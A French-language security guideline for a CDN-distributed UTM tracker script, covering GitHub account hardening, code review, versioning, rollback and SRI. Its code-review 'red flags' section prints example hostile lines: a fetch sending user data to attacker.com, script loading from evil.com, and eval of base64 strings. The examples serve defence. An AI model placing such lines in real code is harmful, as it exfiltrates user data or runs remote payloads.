# Security Guidelines

**Protection contre compromission du code distribué via CDN**

---

## Threat Model

### Risques Identifiés

| Risque | Impact | Probabilité | Mitigation |
|--------|--------|-------------|------------|
| **Compte GitHub compromis** | CRITIQUE | Faible | 2FA + Token scopes |
| **Code malicieux pushé** | CRITIQUE | Faible | Code review + Branch protection |
| **jsDelivr compromis** | CRITIQUE | Très faible | Alternative CDN ready |
| **Repo forké par tiers** | AUCUN | Élevé | N/A (pas un problème) |

---

## Mitigations Obligatoires

### 1. Sécuriser Compte GitHub (MUST HAVE)

#### Enable 2FA (Two-Factor Authentication)

**Action NOW:**
1. GitHub → Settings → Password and authentication
2. Enable two-factor authentication
3. Use authenticator app (Google Authenticator, Authy)
4. Save recovery codes dans password manager

**Commande rapide:**
```bash
# Vérifier si 2FA activé
gh auth status
```

**Status:** 🔴 **À FAIRE IMMÉDIATEMENT**

#### Use Personal Access Tokens (PAT) avec Scopes Limités

**Au lieu de mot de passe:**
1. GitHub → Settings → Developer settings → Personal access tokens
2. Generate new token (classic)
3. Scopes minimum nécessaires:
   - ✅ `repo` (pour push)
   - ❌ PAS `admin:org`
   - ❌ PAS `delete_repo`
4. Expiration: 90 jours (force rotation)

**Configure localement:**
```bash
# Utiliser token au lieu de password
git remote set-url origin https://YOUR-TOKEN@github.com/jamespicard-del/utm-tracker.git
```

#### SSH Keys avec Passphrase

**Alternative aux PAT:**
```bash
# Générer SSH key avec passphrase fort
ssh-keygen -t ed25519 -C "your_email@example.com"

# Ajouter à ssh-agent
ssh-add ~/.ssh/id_ed25519

# Copier public key
cat ~/.ssh/id_ed25519.pub

# GitHub → Settings → SSH keys → Add new
```

---

### 2. Branch Protection Rules

**Empêcher push direct sur main sans review:**

**GitHub → Settings → Branches → Add rule:**

```
Branch name pattern: main

✅ Require a pull request before merging
✅ Require approvals (1 minimum)
✅ Require status checks to pass
✅ Require signed commits (optionnel mais recommandé)
❌ Allow force pushes (DANGEROUS)
❌ Allow deletions (DANGEROUS)
```

**Workflow avec protection:**
```bash
# 1. Créer branch pour changements
git checkout -b feature/add-gdpr-compliance

# 2. Faire changements
vim v1/tracker.js

# 3. Commit + push branch
git add v1/tracker.js
git commit -m "Add GDPR compliance"
git push origin feature/add-gdpr-compliance

# 4. Créer Pull Request sur GitHub
# 5. Review le code TOI-MÊME
# 6. Merge PR → main
# 7. Tag version
git checkout main
git pull
git tag v1.1.0
git push --tags
```

**Bénéfice:** Même si compte compromis, attaquant ne peut pas push direct sur main.

---

### 3. Signed Commits (Git Commit Signature)

**Vérifier que TU as vraiment fait le commit:**

**Setup GPG key:**
```bash
# Générer GPG key
gpg --full-generate-key
# Choisir: RSA 4096, pas d'expiration

# Lister keys
gpg --list-secret-keys --keyid-format=long

# Configurer Git
git config --global user.signingkey YOUR_GPG_KEY_ID
git config --global commit.gpgsign true

# Exporter public key
gpg --armor --export YOUR_GPG_KEY_ID

# GitHub → Settings → SSH and GPG keys → Add GPG key
```

**Commits signés:**
```bash
git commit -S -m "v1.1.0: Add feature"
# -S = signed commit
```

**Vérification sur GitHub:** Commit aura badge "Verified" ✅

**Bénéfice:** Attaquant sans ta GPG key ne peut pas créer commits "Verified".

---

### 4. Code Review Before Tagging

**Process STRICT avant chaque release:**

```bash
# 1. Review les changements
git diff v1.0.0..HEAD

# 2. Vérifier CHAQUE ligne modifiée
# - Pas de code malveillant
# - Pas d'appels externes (fetch, XHR vers domaines suspects)
# - Pas de obfuscation suspecte

# 3. Test local avant push
open v1/tracker.js  # Visual inspection

# 4. SEULEMENT après review: tag + push
git tag v1.1.0
git push --tags
```

**Red Flags dans Code Review:**

❌ **Obfuscation:**
```javascript
eval(atob("BASE64_STRING"))  // SUSPECT
```

❌ **External calls:**
```javascript
fetch("https://attacker.com/collect", {method: "POST", body: userData})
```

❌ **Dynamic script loading:**
```javascript
document.createElement('script').src = "https://evil.com/malware.js"
```

❌ **Unexpected dependencies:**
```javascript
import secretLibrary from "https://cdn.badactor.com/lib.js"
```

---

### 5. Versioning Strategy (Limiter Blast Radius)

**Clients sur @v1, PAS @latest:**

```html
<!-- ✅ SAFE: Seulement v1.x.x updates -->
<script src="https://cdn.jsdelivr.net/gh/jamespicard-del/utm-tracker@v1/v1/tracker.js"></script>

<!-- ❌ RISKY: Tout commit auto-déployé -->
<script src="https://cdn.jsdelivr.net/gh/jamespicard-del/utm-tracker@latest/v1/tracker.js"></script>
```

**Bénéfice:** Si compromis sur v2, v1 clients pas affectés.

**Breaking changes = nouvelle major version:**
- v1.x.x → Clients auto-update (safe)
- v2.0.0 → Clients DOIVENT migrer manuellement

---

### 6. Rollback Procedure

**Si code malicieux déployé accidentellement:**

```bash
# 1. IMMÉDIATEMENT: Delete tag malveillant
git tag -d v1.5.0  # local
git push origin :refs/tags/v1.5.0  # remote

# 2. Revenir à version saine
git checkout v1.4.0

# 3. Créer hotfix branch
git checkout -b hotfix/rollback-v1.5.0

# 4. Re-tag version saine comme v1.6.0 (forward-only)
git tag v1.6.0
git push origin hotfix/rollback-v1.5.0
git push --tags

# 5. jsDelivr va servir v1.6.0 (version saine)
# 6. Clients update en 24-48h
```

**Propagation rollback:** 24-48h (même délai qu'update)

> ℹ️ **Depuis v1.3.0 :** la publication multi-path (`/v1.3.0/`, `/v1/`, `/latest/`) est automatisée par l'action GitHub `jpmetrix-cdn` au tag push (plus besoin d'attendre jsDelivr manuellement) — le rollback ci-dessus reste valide, juste plus rapide.

---

### 7. Monitoring & Alerting

**GitHub Notifications:**

**Settings → Notifications:**
- ✅ Email me when: Pushes to main
- ✅ Email me when: New releases
- ✅ Email me when: Security alerts

**Recevoir email à CHAQUE push = détection immédiate si compromis.**

**jsDelivr Stats (Optionnel):**
- Monitorer traffic spikes suspects
- https://www.jsdelivr.com/package/gh/jamespicard-del/utm-tracker

**Client-Side Error Tracking (Optionnel):**
```javascript
// Dans tracker.js
window.addEventListener('error', function(e) {
  if (e.filename.includes('tracker.js')) {
    // Log error à ton serveur (optionnel)
    console.error('UTM Tracker error:', e.message);
  }
});
```

---

## Mitigations Avancées (Optionnelles)

### 8. Subresource Integrity (SRI)

**Garantir que le fichier n'a PAS changé:**

```html
<script
  src="https://cdn.jsdelivr.net/gh/jamespicard-del/utm-tracker@v1/v1/tracker.js"
  integrity="sha384-HASH_DU_FICHIER"
  crossorigin="anonymous">
</script>
```

**Générer le hash:**
```bash
curl https://cdn.jsdelivr.net/gh/jamespicard-del/utm-tracker@v1/v1/tracker.js | \
  openssl dgst -sha384 -binary | \
  openssl base64 -A
```

**Trade-off:**
- ✅ **Pro:** Browser bloque si fichier modifié (sécurité max)
- ❌ **Con:** Casse les auto-updates (hash change à chaque version)
- **Usage:** Seulement pour clients qui veulent frozen version

**Workflow avec SRI:**
1. Release v1.1.0
2. Générer SRI hash
3. Envoyer nouveau script tag aux clients (avec nouveau hash)
4. Clients update manuellement

**Recommandation:** PAS pour auto-update workflow, SEULEMENT frozen versions.

---

### 9. Self-Hosting Alternative

**Si tu veux ZERO dépendance externe:**

**Option A: Cloudflare Workers (Gratuit)**

```javascript
// worker.js sur Cloudflare
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const trackerJS = `
    // Ton code tracker.js ici (hardcodé)
  `;

  return new Response(trackerJS, {
    headers: {
      'Content-Type': 'application/javascript',
      'Cache-Control': 'public, max-age=86400'
    }
  });
}
```

**Clients chargent depuis:**
```
https://utm-tracker.jpsystem.ca/tracker.js
```

**Pro:**
- ✅ Full control (pas de GitHub, pas de jsDelivr)
- ✅ Custom domain
- ✅ Gratuit (100k requests/jour)

**Con:**
- ❌ Deploy manuel à chaque update
- ❌ Perd versioning automatique

---

### 10. Canary Deployment

**Tester nouvelle version sur 1 client avant rollout général:**

```html
<!-- Client pilote (canary) -->
<script src="https://cdn.jsdelivr.net/gh/jamespicard-del/utm-tracker@latest/v1/tracker.js"></script>

<!-- Clients production (stable) -->
<script src="https://cdn.jsdelivr.net/gh/jamespicard-del/utm-tracker@v1/v1/tracker.js"></script>
```

**Workflow:**
1. Push changements sur main
2. Client canary teste pendant 24-48h
3. Si OK: Tag v1.x.x (rollout à tous)
4. Si problème: Revert avant tag

---

## Security Checklist

### Before Each Release

- [ ] Code review complet (diff depuis dernière version)
- [ ] Pas d'appels externes suspects
- [ ] Pas d'obfuscation
- [ ] Test local fonctionnel
- [ ] Changelog updated
- [ ] Commit signé (si GPG setup)
- [ ] Tag version sémantique
- [ ] Push avec --tags

### Monthly Audit

- [ ] Vérifier 2FA actif sur GitHub
- [ ] Vérifier PAT pas expiré
- [ ] Review commits récents (tous légitimes?)
- [ ] Check GitHub security alerts
- [ ] Vérifier aucun collaborateur suspect sur repo

### If Compromised

1. **IMMÉDIAT:** Change password GitHub + rotate 2FA
2. Delete tag malveillant (`git push origin :refs/tags/vX.X.X`)
3. Review tous les commits depuis compromission
4. Rollback à version saine
5. Notifier clients si nécessaire
6. Post-mortem: Comment attaquant a accédé?

---

## Recommandations Finales

### Must Have (DO NOW)

1. ✅ **Enable 2FA sur GitHub** (5 min)
2. ✅ **Use PAT avec scopes limités** (10 min)
3. ✅ **Email notifications sur pushes** (2 min)
4. ✅ **Code review avant chaque tag** (habit)

### Should Have (Phase 2)

5. ⚠️ **Branch protection rules** (15 min setup)
6. ⚠️ **Signed commits GPG** (30 min setup)
7. ⚠️ **Canary deployment** (1 client pilote)

### Nice to Have (Advanced)

8. 💡 **SRI hashes** (frozen versions only)
9. 💡 **Self-hosting Cloudflare** (si besoin full control)
10. 💡 **Monthly security audit** (15 min/mois)

---

## Risk Assessment

| Scenario | Impact | Probabilité | Mitigation Priority |
|----------|--------|-------------|---------------------|
| GitHub account hack | CRITIQUE | Faible (avec 2FA) | **MUST** |
| Malicious code push | CRITIQUE | Faible (avec review) | **MUST** |
| jsDelivr compromise | CRITIQUE | Très faible | SHOULD |
| Accidental bad code | MOYEN | Moyen | SHOULD |
| Fork/copie par tiers | AUCUN | Élevé | N/A |

---

**TL;DR:**

1. **Enable 2FA NOW** (stop 99% des hacks)
2. **Review code avant chaque tag** (stop code malveillant)
3. **Clients sur @v1** (limite blast radius)
4. **Rollback ready** (24-48h pour fix si problème)

**Avec ces 4 actions, tu es 99.9% sécurisé.**

---

**Last updated:** 2026-07-13 (note ajoutée : publication CDN automatisée via action `jpmetrix-cdn` depuis v1.3.0 — reste guidance générale et non-versionnée par ailleurs)
**Script version at last review:** 1.3.0
